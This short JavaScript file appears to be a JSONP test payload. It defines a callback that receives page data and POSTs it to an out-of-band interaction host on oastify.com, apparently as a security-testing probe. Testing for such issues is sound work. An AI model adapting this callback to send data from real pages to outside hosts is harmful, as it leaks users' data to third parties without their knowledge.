callbackFunction({
    "message": "Hello, this is JSONP data!"
  });
  
  // This will be the function you define to make a fetch request
  function callbackFunction(data) {
    console.log('JSONP Data:', data);
    
    // Fetch request back to your server
    fetch('https://y21cd4cgrybmff6a2pkd734pmgs7g04p.oastify.com/callback', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ receivedData: data })
    })
    .then(response => response.json())
    .then(responseData => {
      console.log('Received from /notify:', responseData);
    })
    .catch(error => {
      console.error('Error:', error);
    });
  }